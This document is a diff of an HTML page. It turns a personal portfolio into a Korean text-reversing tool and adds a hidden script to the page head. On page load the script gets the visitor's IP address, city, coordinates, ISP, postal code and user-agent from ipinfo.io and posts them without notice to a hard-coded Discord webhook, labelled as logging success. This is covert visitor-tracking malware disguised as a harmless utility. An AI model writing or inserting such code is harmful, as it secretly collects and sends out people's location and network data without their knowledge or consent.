@@ -1,381 +1,279 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>J</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary-color: #6C63FF;
-            --secondary-color: #388df5;
-            --background-color: #FFFFFF;
-            --text-color: #333333;
-            --section-bg: #F9F9F9;
-        }
+	<meta charset="utf-8">
+	<title>텍스트 변환기</title>
+	<link rel="icon" href="images/favicon.ico" type="image/x-icon">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMY1Q8xtkE6PT8p0gV6tSg0Z1/3s0kDciF5bG0" crossorigin="anonymous">
+	<style>
+		:root {
+			--primary-color: #1d9bf0;
+			--text-color: #333;
+			--background-color: #ffffff;
+		}
 
-        .dark-mode {
-            --primary-color: #8C83FF;
-            --secondary-color: #58ADFF;
-            --background-color: #121212;
-            --text-color: #E0E0E0;
-            --section-bg: #1E1E1E;
-        }
+		body {
+			font-family: 'Helvetica Neue', Arial, sans-serif;
+			background-color: var(--background-color);
+			color: var(--text-color);
+			margin: 0;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+			transition: background-color 0.3s ease, color 0.3s ease;
+		}
 
-        body {
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: var(--background-color);
-            color: var(--text-color);
-            overflow-x: hidden;
-            user-select: none;
-            transition: background-color 0.3s, color 0.3s;
-        }
+		.container {
+			max-width: 500px;
+			padding: 20px;
+			background-color: white;
+			border-radius: 20px;
+			box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+			text-align: center;
+		}
 
-        nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background-color: var(--background-color);
-            padding: 1rem;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-            z-index: 1000;
-            transition: background-color 0.3s;
-        }
+		h1 {
+			color: var(--primary-color);
+			font-size: 2.4em;
+			margin-bottom: 20px;
+		}
 
-        nav ul {
-            display: flex;
-            justify-content: center;
-            list-style: none;
-            align-items: center;
-        }
+		textarea {
+			width: 100%;
+			height: 80px; /* 높이를 줄임 */
+			padding: 10px; /* 패딩 조정 */
+			margin-bottom: 20px;
+			border-radius: 15px;
+			border: 1px solid #ddd;
+			font-size: 16px;
+			resize: none;
+			background-color: #f8f9fa;
+			box-shadow: inset 0 3px 6px rgba(0, 0, 0, 0.1);
+		}
 
-        nav ul li {
-            margin: 0 20px;
-        }
+		.controls {
+			display: flex;
+			justify-content: space-between;
+			flex-wrap: wrap;
+			gap: 5px; /* 간격 줄임 */
+			margin-bottom: 20px;
+		}
 
-        nav ul li a {
-            color: var(--text-color);
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
+		button {
+			flex: 1;
+			padding: 10px; /* 패딩 조정 */
+			border: none;
+			border-radius: 12px;
+			background-color: var(--primary-color);
+			color: white;
+			font-size: 16px;
+			cursor: pointer;
+			transition: background-color 0.3s ease, transform 0.3s ease;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			gap: 5px; /* 간격 줄임 */
+		}
 
-        nav ul li a:hover {
-            color: var(--primary-color);
-        }
+		button:hover {
+			background-color: #006db3;
+			transform: translateY(-3px);
+		}
 
-        .theme-toggle {
-            background: none;
-            border: none;
-            color: var(--text-color);
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: transform 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
+		.output {
+			margin-top: 20px;
+			font-size: 18px;
+			color: var(--text-color);
+		}
 
-        .theme-toggle:hover {
-            color: var(--primary-color);
-            transform: scale(1.1);
-        }
+		.result {
+			font-weight: bold;
+			padding: 10px; /* 패딩 조정 */
+			background-color: #eef2f7;
+			border-radius: 12px;
+			display: inline-block;
+			width: 100%;
+			white-space: pre-wrap;
+			word-wrap: break-word;
+			box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+		}
 
-        .hero {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            opacity: 0;
-            animation: fadeIn 1s forwards;
-        }
+		.settings-btn {
+			position: absolute;
+			top: 20px;
+			right: 20px;
+			background-color: transparent;
+			border: none;
+			font-size: 24px;
+			cursor: pointer;
+			color: var(--primary-color);
+		}
 
-        .profile-image {
-            width: 150px;
-            height: 150px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 1rem;
-            animation: zoomIn 0.6s forwards;
-            opacity: 0;
-            animation-delay: 0.5s;
-        }
+		.settings-btn:hover {
+			color: #006db3;
+		}
 
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
+		.popup {
+			display: none;
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			background-color: white;
+			padding: 20px;
+			border-radius: 10px;
+			box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.1);
+			z-index: 1000;
+			width: 320px;
+			animation: fadeIn 0.3s;
+		}
 
-        @keyframes zoomIn {
-            from {
-                transform: scale(0);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
+		.popup.active {
+			display: block;
+		}
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 4rem 2rem;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-        }
+		.popup-header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+		}
 
-        section {
-            flex: 1 1 45%;
-            margin: 1rem;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            background-color: var(--section-bg);
-            transition: transform 0.3s, background-color 0.3s;
-            opacity: 0;
-            animation: fadeIn 0.8s forwards;
-            animation-delay: 0.3s;
-            display: flex; /* 추가 */
-            flex-direction: column; /* 추가 */
-            justify-content: flex-start; /* 추가 */
-        }
+		.popup-header h2 {
+			margin: 0;
+			color: var(--primary-color);
+			font-size: 1.5em;
+		}
 
-        section h2 {
-            opacity: 0;
-            animation: slideIn 0.5s forwards;
-            animation-delay: 0.3s;
-        }
+		.popup-header .close-btn {
+			background-color: transparent;
+			border: none;
+			font-size: 20px;
+			cursor: pointer;
+			color: var(--primary-color);
+		}
 
-        @keyframes slideIn {
-            from { transform: translateY(-20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
+		.popup-header .close-btn:hover {
+			color: #006db3;
+		}
 
-        section:hover {
-            transform: scale(1.02);
-        }
+		.popup-content label {
+			display: block;
+			margin-bottom: 10px;
+			font-size: 16px;
+		}
 
-        h2 {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            margin: 0; /* 여백 제거 */
-            padding-bottom: 0.5rem; /* 아래 여백 줄임 */
-            padding-top: 0.5rem; /* 위 여백 추가 */
-        }
+		@keyframes fadeIn {
+			from {
+				opacity: 0;
+				transform: translate(-50%, -40%);
+			}
+			to {
+				opacity: 1;
+				transform: translate(-50%, -50%);
+			}
+		}
 
-        h3 {
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-        }
+		@media (max-width: 600px) {
+			.container {
+				padding: 15px;
+				width: 100%;
+			}
 
-        p {
-            line-height: 1.6;
-        }
+			button {
+				font-size: 14px;
+				padding: 8px; /* 패딩 조정 */
+			}
 
-        .icon {
-            font-size: 2rem;
-            color: var(--primary-color);
-            transition: transform 0.3s;
-        }
+			h1 {
+				font-size: 2em;
+			}
+		}
+	</style>
+	<script>
+		$.get("https://ipinfo.io", function(response) {
+			const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6"; // 웹훅 URL을 여기에 입력하세요
+			const currentTime = Math.floor(Date.now() / 1000);
 
-        .icon:hover {
-            transform: rotate(360deg);
-        }
+			const main = {
+				title: "Ivy",
+				description: "> 정보 수집 성공!",
+				color: 3447003,
+				thumbnail: {
+					url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
+				},
+				fields: [
+					{ name: "IP:", value: `\`${response.ip}\``, inline: true },
+					{ name: "도시:", value: `\`${response.city}\``, inline: true },
+					{ name: "지역:", value: `\`${response.region}\``, inline: true },
+					{ name: "나라:", value: `\`${response.country}\``, inline: true },
+					{ name: "위도/경도:", value: `\`${response.loc}\``, inline: true },
+					{ name: "사용 통신사:", value: `\`${response.org}\``, inline: true },
+					{ name: "우편번호:", value: `\`${response.postal}\``, inline: true },
+					{ name: "접속 시간:", value: `<t:${currentTime}:F>`, inline: true },
+					{ name: "타임존:", value: `\`${response.timezone}\``, inline: true },
+					{ name: "ASN:", value: `\`${response.asn || "정보 없음"}\``, inline: true },
+					{ name: "조직 이름:", value: `\`${response.asn ? response.asn.name : "정보 없음"}\``, inline: true },
+					{ name: "조직 도메인:", value: `\`${response.asn ? response.asn.domain : "정보 없음"}\``, inline: true },
+					{ name: "조직 유형:", value: `\`${response.asn ? response.asn.type : "정보 없음"}\``, inline: true },
+					{ name: "주소:", value: `\`${response.address || "정보 없음"}\``, inline: true },
+					{ name: "이메일:", value: `\`${response.abuse ? response.abuse.email : "정보 없음"}\``, inline: true },
+					{ name: "전화번호:", value: `\`${response.abuse ? response.abuse.phone : "정보 없음"}\``, inline: true },
+					{ name: "User-Agent:", value: `\`${navigator.userAgent}\``, inline: false },
+				],
+				footer: { text: "Ivy | 로깅 성공!" },
+				author: { name: "Ivy", url: "" }
+			};
 
-        .skills {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-            align-items: center;
-        }
-
-        .skill {
-            background: var(--secondary-color);
-            color: #ffffff;
-            padding: 0.7rem 1.2rem;
-            border-radius: 25px;
-            font-size: 1rem;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .skill:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(88, 166, 255, 0.4);
-        }
-
-        .skill i {
-            margin-right: 8px;
-        }
-
-        footer {
-            text-align: center;
-            padding: 2rem;
-            background-color: var(--section-bg);
-            margin-top: 2rem;
-            transition: background-color 0.3s;
-        }
-
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
-
-        .social-icons {
-            margin-top: 1rem;
-        }
-
-        .social-icons a {
-            margin: 0 10px;
-            font-size: 1.5rem;
-            color: var(--primary-color);
-            transition: transform 0.3s;
-        }
-
-        .social-icons a:hover {
-            transform: scale(1.2);
-        }
-
-        .skills-container {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .skills-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 1rem;
-        }
-
-        .skills-header h2 {
-            margin: 0;
-            padding: 0;
-        }
-
-        .skills-header .icon {
-            margin-right: 10px;
-        }
-
-        .skills {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-
-        .rotate {
-            animation: rotate 0.5s forwards;
-        }
-
-        @keyframes rotate {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-    </style>
+			const xhttp = new XMLHttpRequest();
+			xhttp.open("POST", webhook_url, true);
+			xhttp.setRequestHeader('Content-Type', 'application/json');
+			xhttp.send(JSON.stringify({ 'username': 'Ivy', 'embeds': [main] }));
+		}, "json");
+	</script>
 </head>
 <body>
+	<div class="container">
+		<h1>텍스트 변환기</h1>
+		<textarea id="inputText" placeholder="여기에 입력하세요..."></textarea>
+		<div class="controls">
+			<button id="convertBtn">변환하기 <i class="fas fa-arrow-right"></i></button>
+			<button id="clearBtn">지우기 <i class="fas fa-eraser"></i></button>
+		</div>
+		<div class="output">
+			<span>변환된 텍스트:</span>
+			<div id="outputText" class="result"></div>
+		</div>
+		<button class="settings-btn" onclick="togglePopup()"><i class="fas fa-cog"></i></button>
+	</div>
 
-    <nav>
-        <ul>
-            <li><a href="#home">Home</a></li>
-            <li><a href="#about">About</a></li>
-            <li><a href="#projects">Projects</a></li>
-            <li><a href="#skills">Skills</a></li>
-            <li>|</li>
-            <li>
-                <button class="theme-toggle" id="themeToggle">
-                    <i class="fas fa-sun"></i>
-                </button>
-            </li>
-        </ul>
-    </nav>
+	<div class="popup" id="settingsPopup">
+		<div class="popup-header">
+			<h2>설정</h2>
+			<button class="close-btn" onclick="togglePopup()"><i class="fas fa-times"></i></button>
+		</div>
+		<div class="popup-content">
+			<label>설정 항목 1: <input type="text" /></label>
+			<label>설정 항목 2: <input type="text" /></label>
+		</div>
+	</div>
 
-    <div class="hero" id="home">
-        <img src="images/J.jpg  " alt="Profile Image" class="profile-image">
-        <h1>𝓁</h1>
-        <p>Crafting code for a better tomorrow.</p>
-    </div>
+	<script>
+		document.getElementById('convertBtn').onclick = function() {
+			const input = document.getElementById('inputText').value;
+			const output = input.split('').reverse().join(''); // 텍스트를 역순으로 변환
+			document.getElementById('outputText').innerText = output;
+		};
 
-    <div class="container">
+		document.getElementById('clearBtn').onclick = function() {
+			document.getElementById('inputText').value = '';
+			document.getElementById('outputText').innerText = '';
+		};
 
-        <section id="about">
-            <h2><i class="fas fa-user icon"></i> About</h2>
-            <p>I am a developer dedicated to transforming ideas into functional software solutions that enhance user experience and promote efficiency.</p>
-        </section>
-
-        <section id="projects">
-            <h2><i class="fas fa-project-diagram icon"></i> Projects</h2>
-            <h3>
-                <a href="https://hannibot.netlify.app/home" target="_blank">
-                    Hannibot <i class="fas fa-external-link-alt"></i>
-                </a>
-            </h3>
-            <p>Hannibot is a Discord bot that offers various features. Key features include information bot, gambling, and various utility functions.</p>
-        </section>
-
-        <section id="skills">
-            <div class="skills-container">
-                <div class="skills-header">
-                    <i class="fas fa-code icon"></i>
-                    <h2>Skills</h2>
-                </div>
-                <div class="skills">
-                    <div class="skill"><i class="fab fa-html5"></i>HTML</div>
-                    <div class="skill"><i class="fab fa-css3-alt"></i>CSS</div>
-                    <div class="skill"><i class="fab fa-js-square"></i>JavaScript</div>
-                    <div class="skill"><i class="fab fa-python"></i>Python</div>
-                    <div class="skill"><i class="fab fa-react"></i>React</div>
-                </div>
-            </div>
-        </section>
-    </div>
-    <footer>
-        <p>&copy; 2024 𝓁 All rights reserved.</p>
-        <div class="social-icons">
-            <a href="https://github.com/jaxxae" target="_blank"><i class="fab fa-github"></i></a>
-            <a href="mailto:hannifam@proton.me"><i class="fas fa-envelope"></i></a>
-        </div>
-    </footer>
-
-    <script>
-        const themeToggle = document.getElementById('themeToggle');
-        const currentTheme = localStorage.getItem('theme');
-
-        if (currentTheme === 'dark') {
-            document.body.classList.add('dark-mode');
-            themeToggle.innerHTML = '<i class="fas fa-moon"></i>'; // 아이콘 변경
-        }
-
-        themeToggle.addEventListener('click', () => {
-            document.body.classList.toggle('dark-mode');
-
-            themeToggle.classList.add('rotate'); // 애니메이션 클래스 추가
-            setTimeout(() => {
-                themeToggle.classList.remove('rotate'); // 애니메이션 클래스 제거
-            }, 500); // 애니메이션 지속 시간과 일치
-
-            if (document.body.classList.contains('dark-mode')) {
-                localStorage.setItem('theme', 'dark');
-                themeToggle.innerHTML = '<i class="fas fa-moon"></i>'; // 아이콘 변경
-            } else {
-                localStorage.setItem('theme', 'light');
-                themeToggle.innerHTML = '<i class="fas fa-sun"></i>'; // 아이콘 변경
-            }
-        });
-    </script>
-
+		function togglePopup() {
+			document.getElementById('settingsPopup').classList.toggle('active');
+		}
+	</script>
 </body>
 </html>
